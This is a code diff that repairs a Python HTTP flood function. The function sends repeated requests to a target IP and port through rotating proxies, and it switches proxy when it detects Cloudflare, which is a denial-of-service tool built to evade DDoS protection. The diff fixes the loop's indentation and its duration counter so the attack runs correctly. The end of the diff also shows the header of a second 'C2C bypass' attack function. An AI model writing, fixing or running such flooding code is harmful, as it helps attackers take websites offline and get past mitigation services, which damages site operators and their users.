@@ -113,20 +113,22 @@ def http_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  "https": proxy,
  }
  while duration > 0:
-     try:
-         response = requests.get(f"http://{target_ip}:{target_port}/", proxies=proxies, timeout=5)
-          if 'cloudflare' in response.text.lower():
-            print("Cloudflare detected, rotating proxy...")
- proxy = get_random_proxy()
- proxies = {
- "http": proxy,
- "https": proxy,
- }
- except Exception as e:
-                       print(f"HTTP Flood Error: {e}")
-                       duration -= 1
-                        time.sleep(1 / requests_per_second)
+    try:
+        response = requests.get(f"http://{target_ip}:{target_port}/", proxies=proxies, timeout=5)
 
+        if 'cloudflare' in response.text.lower():
+            print("Cloudflare detected, rotating proxy...")
+            proxy = get_random_proxy()
+            proxies = {
+                "http": proxy,
+                "https": proxy,
+            }
+
+    except Exception as e:
+        print(f"HTTP Flood Error: {e}")
+
+    duration -= 1
+    time.sleep(1 / requests_per_second) 
 # C2C (Client to Client) Bypass with Proxy and Cloudflare Bypass
 def c2c_bypass_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  proxy = get_random_proxy()
